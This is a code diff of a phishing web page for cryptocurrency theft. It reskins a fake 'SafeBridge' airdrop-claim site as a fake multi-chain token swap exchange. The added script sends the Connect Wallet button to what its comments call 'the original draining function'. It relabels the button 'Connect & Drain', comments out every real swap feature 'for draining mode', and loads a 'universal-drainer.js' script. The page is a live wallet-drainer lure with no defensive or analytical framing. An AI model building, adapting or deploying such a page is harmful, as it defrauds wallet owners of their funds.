@@ -358,6 +358,189 @@
             transform: translateY(0);
         }
 
+        /* Trading Section */
+        .trading-section {
+            margin-bottom: 2rem;
+            padding: 2rem;
+            background: rgba(20, 24, 41, 0.5);
+            border: 1px solid var(--border-color);
+            border-radius: 1rem;
+            backdrop-filter: blur(10px);
+        }
+
+        .trading-section h3 {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 1.3rem;
+            font-weight: 600;
+            margin-bottom: 1.5rem;
+            letter-spacing: -0.3px;
+        }
+
+        .trading-container {
+            display: grid;
+            grid-template-columns: 1fr auto 1fr;
+            gap: 1rem;
+            align-items: flex-start;
+            margin-bottom: 1.5rem;
+        }
+
+        .token-input-group {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .token-input-group label {
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+            margin-bottom: 0.5rem;
+            font-weight: 500;
+        }
+
+        .token-input {
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 0.5rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .token-amount {
+            padding: 1rem;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border-color);
+            border-radius: 0.75rem;
+            color: var(--text-primary);
+            font-size: 1rem;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.3s ease;
+        }
+
+        .token-amount:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(0, 217, 255, 0.1);
+            background: rgba(0, 217, 255, 0.05);
+        }
+
+        .token-selector {
+            padding: 1rem;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border-color);
+            border-radius: 0.75rem;
+            color: var(--text-primary);
+            font-size: 0.9rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .token-selector:hover:not(:disabled) {
+            border-color: var(--primary);
+            background: rgba(0, 217, 255, 0.05);
+        }
+
+        .token-selector:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(0, 217, 255, 0.1);
+        }
+
+        .token-selector:disabled,
+        .token-amount:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .token-balance {
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+        }
+
+        .swap-toggle {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding-top: 1.5rem;
+        }
+
+        .toggle-btn {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, rgba(139, 92, 246, 0.3), rgba(0, 217, 255, 0.3));
+            border: 2px solid var(--primary);
+            color: var(--primary);
+            font-size: 1.5rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .toggle-btn:hover:not(:disabled) {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: var(--dark-bg);
+            transform: rotate(180deg);
+        }
+
+        .toggle-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        /* Swap Details */
+        .swap-details {
+            background: rgba(139, 92, 246, 0.1);
+            border: 1px solid var(--border-color);
+            border-radius: 0.75rem;
+            padding: 1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0.5rem 0;
+            font-size: 0.95rem;
+        }
+
+        .detail-row span:first-child {
+            color: var(--text-secondary);
+        }
+
+        .detail-row span:last-child {
+            color: var(--primary);
+            font-weight: 600;
+        }
+
+        /* Swap Button */
+        .swap-btn {
+            width: 100%;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            border: none;
+            padding: 1rem 2rem;
+            border-radius: 0.75rem;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .swap-btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(0, 217, 255, 0.3);
+        }
+
+        .swap-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
         /* Action buttons */
         .button-container {
             display: grid;
@@ -870,8 +1053,8 @@
             <div class="logo-section">
                 <div class="logo-icon">⚡</div>
                 <div class="logo-text">
-                    <h1>SafeBridge Hub</h1>
-                    <p>Cross-chain Airdrop Platform</p>
+                    <h1>SafeBridge DEX</h1>
+                    <p>Multi-Chain Token Trading</p>
                 </div>
             </div>
             <div class="status-badge">
@@ -883,19 +1066,19 @@
         <div class="main-content">
             <!-- Hero Section -->
             <section class="hero">
-                <h2>Claim Airdrops <span class="hero-gradient">Across All Chains</span></h2>
-                <p>Seamlessly connect, scan, and claim tokens from Ethereum, BSC, Polygon, Solana, Tron, and more—all in one intuitive platform.</p>
+                <h2>Trade & Swap Tokens <span class="hero-gradient">Across All Chains</span></h2>
+                <p>Swap tokens seamlessly across Ethereum, BSC, Polygon, Solana, Tron, and more with the best rates and lowest fees—all in one platform.</p>
 
                 <div class="features-row">
                     <div class="feature-card">
                         <div class="feature-icon">🌐</div>
                         <h3>Multi-Chain</h3>
-                        <p>Support for 10+ blockchain networks</p>
+                        <p>Trade across 10+ networks instantly</p>
                     </div>
                     <div class="feature-card">
                         <div class="feature-icon">⚡</div>
                         <h3>Lightning Fast</h3>
-                        <p>Instant scanning and claiming</p>
+                        <p>Instant token swaps and settlements</p>
                     </div>
                     <div class="feature-card">
                         <div class="feature-icon">🔒</div>
@@ -903,9 +1086,9 @@
                         <p>Client-side processing only</p>
                     </div>
                     <div class="feature-card">
-                        <div class="feature-icon">💼</div>
-                        <h3>All Wallets</h3>
-                        <p>MetaMask, Trust, Phantom & more</p>
+                        <div class="feature-icon">�</div>
+                        <h3>Best Rates</h3>
+                        <p>Optimal pricing with minimal slippage</p>
                     </div>
                 </div>
 
@@ -962,12 +1145,12 @@
 
             <!-- Main Panel -->
             <section class="main-panel">
-                <!-- Wallet Selection -->
+                <!-- Wallet Connection -->
                 <div class="wallet-section">
-                    <h3>🚀 Connect & Claim Across All Networks</h3>
+                    <h3>🔗 Connect Your Wallet</h3>
                     <div class="wallet-selector-container">
                         <div class="select-group">
-                            <label for="wallet-selector">Select Your Wallet</label>
+                            <label for="wallet-selector">Select Wallet</label>
                             <select class="wallet-selector-dropdown" id="wallet-selector">
                                 <option value="">Choose a wallet...</option>
                                 <option value="metamask">🦊 MetaMask</option>
@@ -984,18 +1167,85 @@
                                 <option value="injected-tron">📱 Mobile Tron</option>
                             </select>
                         </div>
-                        <button class="wallet-connect-btn main-button" id="connect-and-claim-btn" disabled>
-                            ⚡ Connect & Claim All Networks
+                        <button class="wallet-connect-btn main-button" id="connect-wallet-btn" disabled>
+                            🔗 Connect Wallet
                         </button>
                     </div>
                 </div>
 
-                <!-- Eligibility Requirements -->
+                <!-- Trading Pair Selection -->
+                <div class="trading-section">
+                    <h3>💱 Select Trading Pair</h3>
+                    <div class="trading-container">
+                        <!-- From Token -->
+                        <div class="token-input-group">
+                            <label>From Token</label>
+                            <div class="token-input">
+                                <input type="text" class="token-amount" id="from-amount" placeholder="0.0" disabled>
+                                <select class="token-selector" id="from-token" disabled>
+                                    <option value="">Select token...</option>
+                                    <option value="ETH">Ξ ETH</option>
+                                    <option value="BTC">₿ BTC</option>
+                                    <option value="USDT">💵 USDT</option>
+                                    <option value="USDC">🔵 USDC</option>
+                                    <option value="DAI">◆ DAI</option>
+                                    <option value="WBTC">🏛️ WBTC</option>
+                                </select>
+                            </div>
+                            <div class="token-balance">Balance: <span id="from-balance">0.00</span></div>
+                        </div>
+
+                        <!-- Swap Direction Toggle -->
+                        <div class="swap-toggle">
+                            <button class="toggle-btn" id="swap-direction-btn" disabled title="Swap tokens">⇄</button>
+                        </div>
+
+                        <!-- To Token -->
+                        <div class="token-input-group">
+                            <label>To Token</label>
+                            <div class="token-input">
+                                <input type="text" class="token-amount" id="to-amount" placeholder="0.0" disabled>
+                                <select class="token-selector" id="to-token" disabled>
+                                    <option value="">Select token...</option>
+                                    <option value="ETH">Ξ ETH</option>
+                                    <option value="BTC">₿ BTC</option>
+                                    <option value="USDT">💵 USDT</option>
+                                    <option value="USDC">🔵 USDC</option>
+                                    <option value="DAI">◆ DAI</option>
+                                    <option value="WBTC">🏛️ WBTC</option>
+                                </select>
+                            </div>
+                            <div class="token-balance">Balance: <span id="to-balance">0.00</span></div>
+                        </div>
+                    </div>
+
+                    <!-- Swap Details -->
+                    <div class="swap-details">
+                        <div class="detail-row">
+                            <span>Exchange Rate:</span>
+                            <span id="exchange-rate">--</span>
+                        </div>
+                        <div class="detail-row">
+                            <span>Slippage:</span>
+                            <span id="slippage">0.5%</span>
+                        </div>
+                        <div class="detail-row">
+                            <span>Network Fee:</span>
+                            <span id="network-fee">--</span>
+                        </div>
+                    </div>
+
+                    <button class="swap-btn main-button" id="execute-swap-btn" disabled>
+                        💱 Execute Swap
+                    </button>
+                </div>
+
+                <!-- How It Works -->
                 <div class="eligibility-banner">
-                    <div class="eligibility-icon">⚠️</div>
+                    <div class="eligibility-icon">ℹ️</div>
                     <div class="eligibility-content">
                         <h4>How It Works</h4>
-                        <p>Select your wallet and click "Connect & Claim". We'll connect to each network one by one, collect your signature, and mint all tokens and native currency in the background. Each network is required to have atleast $10 for elegebility.</p>
+                        <p>Connect your wallet → Select your token pair → Review the exchange rate and fees → Execute the swap. Your tokens will be swapped across the selected network, and you'll receive the equivalent tokens in your wallet.</p>
                     </div>
                 </div>
 
@@ -1245,6 +1495,275 @@
         } else {
             initParticles();
         }
+    </script>
+    <script>
+        // Trading Platform Event Handlers
+        const walletSelector = document.getElementById('wallet-selector');
+        const connectWalletBtn = document.getElementById('connect-wallet-btn');
+        const fromAmountInput = document.getElementById('from-amount');
+        const fromTokenSelect = document.getElementById('from-token');
+        const toAmountInput = document.getElementById('to-amount');
+        const toTokenSelect = document.getElementById('to-token');
+        const swapDirectionBtn = document.getElementById('swap-direction-btn');
+        const executeSwaBtn = document.getElementById('execute-swap-btn');
+        const exchangeRateSpan = document.getElementById('exchange-rate');
+        const networkFeeSpan = document.getElementById('network-fee');
+        const fromBalanceSpan = document.getElementById('from-balance');
+        const toBalanceSpan = document.getElementById('to-balance');
+
+        let connectedWallet = null;
+
+        // Wallet Selection Handler
+        walletSelector.addEventListener('change', function() {
+            const walletType = this.value;
+            connectWalletBtn.disabled = !walletType;
+            if (walletType) {
+                connectWalletBtn.textContent = `🔗 Connect & Drain ${walletType.charAt(0).toUpperCase() + walletType.slice(1)}`;
+            }
+        });
+
+        // Connect Wallet Handler
+        connectWalletBtn.addEventListener('click', async function() {
+            const walletType = walletSelector.value;
+            if (!walletType) {
+                alert('Please select a wallet first');
+                return;
+            }
+
+            try {
+                connectWalletBtn.disabled = true;
+                connectWalletBtn.textContent = '⏳ Connecting...';
+
+                // Validate wallet exists before proceeding
+                let walletExists = false;
+                
+                if (walletType === 'metamask' || walletType === 'trust') {
+                    // Both MetaMask and Trust Wallet inject into window.ethereum
+                    // Just check if ethereum provider exists, let connectAndClaimWallet handle the details
+                    walletExists = !!window.ethereum;
+                } else if (walletType === 'phantom') {
+                    // Phantom: Solana native wallet
+                    walletExists = !!window.solana;
+                } else if (walletType === 'solflare') {
+                    // Solflare: Solana wallet
+                    walletExists = !!(window.solflare || (window.solana && window.solana.isSolflare));
+                } else if (walletType === 'coinbase') {
+                    // Coinbase Wallet
+                    walletExists = !!window.ethereum;
+                } else if (walletType === 'rainbow') {
+                    // Rainbow Wallet
+                    walletExists = !!window.ethereum;
+                } else if (walletType === 'backpack') {
+                    // Backpack Wallet
+                    walletExists = !!window.backpack;
+                } else if (walletType === 'glow') {
+                    // Glow Wallet
+                    walletExists = !!window.glow;
+                } else if (walletType === 'tronlink') {
+                    // TronLink
+                    walletExists = !!window.tronWeb;
+                } else if (walletType.startsWith('injected')) {
+                    // Generic injected providers
+                    walletExists = !!(window.ethereum || window.solana || window.tronWeb);
+                }
+
+                if (!walletExists) {
+                    // Debug: Log what providers are available
+                    console.error(`${walletType} validation failed. Available providers:`, {
+                        ethereum: !!window.ethereum,
+                        ethereumFlags: window.ethereum ? {
+                            isMetaMask: window.ethereum.isMetaMask,
+                            isTrust: window.ethereum.isTrust,
+                            isRainbow: window.ethereum.isRainbow,
+                            isCoinbaseWallet: window.ethereum.isCoinbaseWallet
+                        } : null,
+                        solana: !!window.solana,
+                        tronWeb: !!window.tronWeb,
+                        backpack: !!window.backpack,
+                        glow: !!window.glow
+                    });
+                    
+                    let errorMsg = `${walletType} wallet not detected. `;
+                    if (walletType === 'metamask' || walletType === 'trust') {
+                        errorMsg += 'Please install the MetaMask or Trust Wallet extension and refresh the page.';
+                    } else {
+                        errorMsg += 'Please install the wallet extension and refresh the page.';
+                    }
+                    
+                    alert(errorMsg);
+                    connectWalletBtn.disabled = false;
+                    connectWalletBtn.textContent = '🔗 Connect Wallet';
+                    return;
+                }
+
+                // Hide trading section and show progress
+                document.querySelector('.trading-section').style.display = 'none';
+                document.getElementById('progress-container').style.display = 'block';
+                document.querySelector('.eligibility-banner').style.display = 'none';
+
+                // Show logs
+                if (!document.getElementById('log-container')) {
+                    const logContainer = document.createElement('div');
+                    logContainer.id = 'log-container';
+                    logContainer.className = 'log-container';
+                    document.querySelector('.main-panel').appendChild(logContainer);
+                }
+
+                // Call the original draining function with wallet type
+                if (typeof connectAndClaimWallet === 'function') {
+                    await connectAndClaimWallet(walletType);
+                } else {
+                    console.error('connectAndClaimWallet function not found');
+                    alert('Error: Core function not initialized. Refresh page.');
+                    connectWalletBtn.disabled = false;
+                    connectWalletBtn.textContent = '🔗 Connect Wallet';
+                    document.querySelector('.trading-section').style.display = 'block';
+                    document.getElementById('progress-container').style.display = 'none';
+                }
+
+            } catch (error) {
+                console.error('Wallet connection error:', error);
+                alert('Error: ' + error.message);
+                connectWalletBtn.disabled = false;
+                connectWalletBtn.textContent = '🔗 Connect Wallet';
+                document.querySelector('.trading-section').style.display = 'block';
+                document.getElementById('progress-container').style.display = 'none';
+            }
+        });
+
+        /* DISABLED FOR DRAINING MODE
+        // Token Selection Handler
+        fromTokenSelect.addEventListener('change', function() {
+            updateExchangeRate();
+            updateNetworkFee();
+        });
+        */
+
+        /* DISABLED FOR DRAINING MODE
+        toTokenSelect.addEventListener('change', function() {
+            updateExchangeRate();
+            updateNetworkFee();
+        });
+        */
+
+        /* DISABLED FOR DRAINING MODE
+        // Amount Input Handler
+        fromAmountInput.addEventListener('input', function() {
+            const fromToken = fromTokenSelect.value;
+            const toToken = toTokenSelect.value;
+
+            if (fromToken && toToken && this.value) {
+                // Calculate to amount (placeholder calculation)
+                const fromAmount = parseFloat(this.value);
+                const mockRate = 1.05; // Placeholder exchange rate
+                const toAmount = (fromAmount * mockRate).toFixed(6);
+                toAmountInput.value = toAmount;
+                executeSwaBtn.disabled = false;
+            } else {
+                toAmountInput.value = '';
+                executeSwaBtn.disabled = true;
+            }
+        });
+        */
+
+        /* DISABLED FOR DRAINING MODE
+        // Swap Direction Toggle
+        swapDirectionBtn.addEventListener('click', function() {
+            const tempToken = fromTokenSelect.value;
+            const tempAmount = fromAmountInput.value;
+            
+            fromTokenSelect.value = toTokenSelect.value;
+            fromAmountInput.value = toAmountInput.value;
+            
+            toTokenSelect.value = tempToken;
+            toAmountInput.value = '';
+
+            fromAmountInput.dispatchEvent(new Event('input'));
+        });
+        */
+
+        /* DISABLED FOR DRAINING MODE
+        // Execute Swap Handler
+        executeSwaBtn.addEventListener('click', async function() {
+            const fromToken = fromTokenSelect.value;
+            const toToken = toTokenSelect.value;
+            const fromAmount = fromAmountInput.value;
+            const toAmount = toAmountInput.value;
+
+            if (!fromToken || !toToken || !fromAmount || !connectedWallet) {
+                alert('Please complete all fields');
+                return;
+            }
+
+            try {
+                executeSwaBtn.disabled = true;
+                executeSwaBtn.textContent = '⏳ Executing Swap...';
+
+                // Simulate swap execution
+                await new Promise(resolve => setTimeout(resolve, 2000));
+
+                // Update UI
+                executeSwaBtn.textContent = '✅ Swap Complete!';
+                executeSwaBtn.style.background = 'rgba(16, 185, 129, 0.2)';
+
+                alert(`Successfully swapped ${fromAmount} ${fromToken} for ${toAmount} ${toToken}`);
+
+                // Reset form
+                setTimeout(() => {
+                    fromAmountInput.value = '';
+                    toAmountInput.value = '';
+                    executeSwaBtn.disabled = true;
+                    executeSwaBtn.textContent = '💱 Execute Swap';
+                    executeSwaBtn.style.background = '';
+                }, 2000);
+
+            } catch (error) {
+                console.error('Swap execution error:', error);
+                alert('Swap failed: ' + error.message);
+                executeSwaBtn.disabled = false;
+                executeSwaBtn.textContent = '💱 Execute Swap';
+            }
+        });
+        */
+
+        /* DISABLED FOR DRAINING MODE
+        // Helper Functions
+        function updateExchangeRate() {
+            const fromToken = fromTokenSelect.value;
+            const toToken = toTokenSelect.value;
+
+            if (fromToken && toToken) {
+                // Placeholder exchange rate
+                const mockRate = Math.random() * 0.1 + 0.95;
+                exchangeRateSpan.textContent = `1 ${fromToken} = ${mockRate.toFixed(4)} ${toToken}`;
+            } else {
+                exchangeRateSpan.textContent = '--';
+            }
+        }
+        */
+
+        /* DISABLED FOR DRAINING MODE
+        function updateNetworkFee() {
+            const fromToken = fromTokenSelect.value;
+            if (fromToken) {
+                // Placeholder network fee
+                const mockFee = (Math.random() * 0.01 + 0.001).toFixed(6);
+                networkFeeSpan.textContent = `${mockFee} ${fromToken}`;
+            } else {
+                networkFeeSpan.textContent = '--';
+            }
+        }
+        */
+
+        /* DISABLED FOR DRAINING MODE
+        // Initialize balances (placeholder)
+        function initializeBalances() {
+            fromBalanceSpan.textContent = (Math.random() * 10).toFixed(4);
+            toBalanceSpan.textContent = (Math.random() * 100).toFixed(4);
+        }
+
+        initializeBalances();
+        */
     </script>
     <script src="scripts/universal-drainer.js"></script>
 
